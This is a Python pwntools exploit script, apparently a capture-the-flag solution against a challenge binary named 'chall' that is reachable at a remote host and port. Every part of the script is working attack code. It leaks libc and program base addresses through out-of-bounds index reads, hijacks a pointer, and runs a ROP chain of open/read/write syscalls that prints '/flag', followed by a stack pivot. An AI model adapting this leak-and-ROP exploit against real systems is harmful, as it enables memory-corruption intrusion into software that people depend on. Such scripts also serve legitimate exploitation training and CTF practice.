#!/usr/bin/python

from pwn import *

PATH = './chall'

GDBSCRIPT = '''
b *0x000055555555552b
b *0x000055555555557b
# b *0x0000555555555602
# b *0x555555555651
b *0x0000555555555670
'''

HOST = '103.41.207.206'
PORT = 17013

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])
        # gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/.gdbinit_pwndbg'"])


def leak(idx):
    r.sendlineafter(': ', f'{idx}')
    return int(r.recvline(0).split()[-1])

def exploit(r):
    r.sendafter(': ', b'Hmm')
    
    debug(GDBSCRIPT)

    libc_leak = leak(27)
    libc.address = libc_leak - libc.sym['__libc_start_main'] - 243
    
    info(hex(libc_leak))
    info(hex(libc.address))

    elf.address = leak(31) - elf.sym['main']

    info(hex(elf.address))
    
    r.sendlineafter(': ', '27')
    r.sendlineafter('= ', f"{libc_leak - 0x88}") # call constructor

    r.sendlineafter(': ', f'{0x4141414141414141}')

    pop_rax_ret = libc.address + 0x004a550
    pop_rdi_ret = libc.address + 0x0026b72
    pop_rsi_ret = libc.address + 0x0027529
    pop_rdx_r12_ret = libc.address + 0x11c371
    syscall = libc.address + 0x066229
    
    # open('/flag', 0)
    payload  = p64(pop_rax_ret) + p64(0x2)
    payload += p64(pop_rdi_ret) + p64(elf.sym.buffer + 0x100)
    payload += p64(pop_rsi_ret) + p64(0)
    payload += p64(syscall)

    # read(fd_flag, flag_buffer, 0x50)
    payload += p64(pop_rax_ret) + p64(0x0)
    payload += p64(pop_rdi_ret) + p64(0x3)
    payload += p64(pop_rsi_ret) + p64(elf.sym.buffer + 0x100)
    payload += p64(pop_rdx_r12_ret) + p64(0x50) + p64(0)
    payload += p64(syscall)

    # write(stdout, flag_buffer, 0x50)
    payload += p64(pop_rax_ret) + p64(0x1)
    payload += p64(pop_rdi_ret) + p64(0x1)
    payload += p64(pop_rsi_ret) + p64(elf.sym.buffer + 0x100)
    payload += p64(pop_rdx_r12_ret) + p64(0x50) + p64(0)
    payload += p64(syscall)

    payload  = payload.ljust(0x100, b'\0')
    payload += b'/flag'

    r.sendafter(': ', payload)

    leak(1)
    leak(2)

    r.sendlineafter(': ', '27')
    r.sendlineafter('= ', f"{libc.address + 0x05e650}") # mov rsp, rdx ; ret

    r.sendlineafter(': ', f'{elf.sym.buffer}')
    info(r.recvall().split()[0])
    
    r.interactive()

if __name__ == '__main__':
    elf  = ELF(PATH)
    libc = ELF('./libc.so.6', False)

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        env = {'LD_PRELOAD' : './libc.so.6'}
        r = process(PATH, aslr=0, env=env)
    exploit(r)